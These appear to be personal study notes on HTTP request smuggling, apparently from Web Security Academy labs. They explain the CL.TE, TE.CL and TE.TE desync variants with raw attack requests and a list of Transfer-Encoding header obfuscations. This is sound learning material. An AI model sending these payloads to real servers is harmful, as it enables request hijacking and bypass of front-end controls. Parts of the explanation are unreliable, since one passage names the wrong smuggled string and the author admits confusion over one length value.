#http
#request-smuggling
Classic attacks:
* **CL.TE**: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. 
* **TE.CL**: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. 
* **TE.TE**: the front-end and back-end servers both support the `Transfer-Encoding header`, but one of the servers can be induced not to process it by obfuscating the header in some way. 

# CL.TE
```http
POST / HTTP/1.1
Host: 0ac8006704cb7888805bd5a00090009f.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
The front-end server processes the Content-Length header and determines that the request body is 6 bytes long, up to the end of `G`. 
he back-end server processes the `Transfer-Encoding` header, treat it as 0 byte chunk and `SMUGGLED` as the start of the next HTTP request.
After the next request will reach the server, server receives request started with `GPOST ...`. 

# TE.CL
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
Frontend process `Transfer-Encoding`, reads first chunk of 8 bytes with SMUGGLED data, then the second chunk is zero and it terminates request.
Backend processes `Content-Length` header and determines content is 3, up to the line following 8. Bytes after it are left unproccessed and will be treated as beginning of the next request.

# TE.TE: obfuscating the TE header
This technique relays on parse header implementation difference. Both servers accept TH header, but one of them doesn't process obfuscating TH header.
Examples of obfuscation:
```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
Example:
```http
POST / HTTP/1.1
Host: 0a8c007703fb2aa38074622200a4006e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n
\r\n
```
(dunno why Content-Length is 15 when its clearly less)
